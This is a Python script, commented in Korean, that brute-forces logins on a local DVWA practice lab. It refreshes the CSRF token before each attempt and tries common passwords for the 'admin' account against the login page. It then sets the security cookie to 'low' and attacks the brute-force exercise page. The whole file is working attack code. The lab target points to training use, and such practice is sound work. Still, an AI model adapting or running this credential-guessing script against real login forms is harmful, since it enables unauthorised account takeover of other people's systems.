import requests
from bs4 import BeautifulSoup
import re
import time

# 세션 설정
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept-Language": "ko-KR,ko;q=0.9"
})

def get_csrf_token(url):
    """CSRF 토큰 추출 함수"""
    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.select_one('input[name="user_token"]')
    return token_input["value"] if token_input else None

def brute_force_login(login_url, passwords):
    """1단계: 로그인 페이지 브루트포스"""
    print("\n" + "="*50)
    print("1단계: 로그인 페이지 브루트포스 시작")
    print("="*50)
    
    for i, pwd in enumerate(passwords):
        try:
            # CSRF 토큰 갱신
            csrf_token = get_csrf_token(login_url)
            if not csrf_token:
                print("[!] CSRF 토큰 추출 실패")
                continue
                
            # 로그인 시도
            login_data = {
                "username": "admin",
                "password": pwd,
                "user_token": csrf_token,
                "Login": "Login"
            }
            response = session.post(login_url, data=login_data)
            
            # 성공 조건 (리다이렉션 확인)
            if response.url == "http://localhost/dvwa/index.php":
                print(f"\n[+] 1단계 성공! 로그인 비밀번호: {pwd}")
                return pwd
            else:
                print(f"[-] 로그인 실패: {pwd} (상태: {response.status_code})")
                
        except Exception as e:
            print(f"[!] 오류 발생: {str(e)}")
    
    print("\n[!] 1단계 공격 실패: 유효한 비밀번호를 찾지 못함")
    return None

def brute_force_admin(target_url, passwords):
    """2단계: Brute Force 페이지 브루트포스"""
    print("\n" + "="*50)
    print("2단계: Brute Force 페이지 브루트포스 시작")
    print("="*50)
    
    for i, pwd in enumerate(passwords):
        try:
            # CSRF 토큰 갱신
            csrf_token = get_csrf_token(target_url)
            if not csrf_token:
                print("[!] CSRF 토큰 추출 실패")
                continue
                
            # 공격 실행
            post_data = {
                "username": "admin",
                "password": pwd,
                "user_token": csrf_token,
                "Login": "Login"
            }
            response = session.post(target_url, data=post_data)
            
            # 성공 조건
            if re.search(r"Welcome to the password protected area", response.text, re.IGNORECASE):
                print(f"\n[+] 2단계 성공! 관리자 비밀번호: {pwd}")
                return pwd
            else:
                print(f"[-] 관리자 로그인 실패: {pwd}")
                
        except Exception as e:
            print(f"[!] 오류 발생: {str(e)}")
    
    print("\n[!] 2단계 공격 실패: 유효한 비밀번호를 찾지 못함")
    return None

if __name__ == "__main__":
    # 대상 URL 설정
    login_url = "http://localhost/dvwa/login.php"
    brute_url = "http://localhost/dvwa/vulnerabilities/brute/"
    
    # 1단계: 로그인 브루트포스
    login_passwords = ["password", "admin", "123456", "root", "test"]
    login_result = brute_force_login(login_url, login_passwords)
    
    if login_result:
        # 보안 레벨 설정 (필수)
        session.cookies.set("security", "low", domain="localhost")
        
        # 2단계: Brute Force 페이지 공격
        admin_passwords = ["password", "admin", "123456", "root", "test"]
        admin_result = brute_force_admin(brute_url, admin_passwords)
        
        # 최종 결과 출력
        print("\n" + "="*50)
        print("최종 결과 요약")
        print("="*50)
        print(f"로그인 비밀번호: {login_result}")
        print(f"관리자 비밀번호: {admin_result if admin_result else '찾지 못함'}")
    else:
        print("\n[!] 로그인 실패로 2단계 공격을 수행할 수 없습니다.")

    print("\n-- 공격 완료 --")
